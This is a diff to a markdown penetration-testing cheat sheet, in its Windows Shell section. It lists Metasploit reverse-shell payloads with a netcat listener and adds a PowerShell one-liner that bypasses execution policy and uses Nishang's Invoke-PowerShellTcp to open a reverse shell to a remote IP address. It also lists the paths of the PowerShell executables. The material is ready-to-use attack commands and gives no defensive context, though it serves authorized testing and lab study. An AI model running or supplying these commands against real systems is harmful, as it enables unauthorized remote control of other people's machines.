@@ -144,6 +144,15 @@ cf : https://github.com/rapid7/metasploit-framework/issues/9556 <br />
 ## Windows Shell
 ```sh 
 //Non-Staged :  (windows/shell_reverse_tcp) && nc -nlvp 443
-//Staged : (windows/shell/reverse_tcp) && use exploit/multi/handler
+//Staged     : (windows/shell/reverse_tcp) && use exploit/multi/handler
 ```
 
+**Powershell Nishang**<br />
+```sh 
+powershell -exec bypass -c Import-Module .\Invoke-PowerShellTcp.ps1;Invoke-PowerShellTcp -Reverse -IPAddress 10.*.*.* -Port 1234
+```
+ref : https://github.com/samratashok/nishang<br />
+
+Powershell location<br />
+-32-bit (x86) PowerShell executable C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+-64-bit (x64) Powershell executable C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
